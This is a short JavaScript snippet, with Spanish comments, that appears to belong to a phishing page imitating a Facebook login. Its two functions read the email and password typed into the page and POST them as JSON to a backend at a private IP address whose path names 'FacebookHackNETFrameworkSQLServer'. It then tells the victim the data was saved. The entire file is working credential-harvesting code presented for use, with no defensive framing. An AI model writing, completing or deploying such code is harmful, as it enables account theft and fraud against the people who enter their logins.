function captureData() {
    var emailUser = document.getElementById("email").value;
    var pwUser = document.getElementById("pw").value;
    sendToAPI(emailUser, pwUser);
}

function sendToAPI(email, pw) {
    var settings = {
        "url": "http://192.168.31.65/FacebookHackNETFrameworkSQLServer/rest/General/facebooklogin",
        "method": "POST", // Cambia de "FETCH" a "POST"
        "timeout": 0,
        "headers": {
            "Content-Type": "application/json"
        },
        "data": JSON.stringify({
            "user": email,
            "pass": pw
        }),
    };

    $.ajax(settings).done(function (response) {
        console.log(response);
        alert("Se guardaron los datos con éxito"); // Mostrar la alerta solo después de que la API responda
    }).fail(function (error) {
        alert("Hubo un problema al guardar los datos");
        console.error(error); // Muestra el error en la consola
    });
}
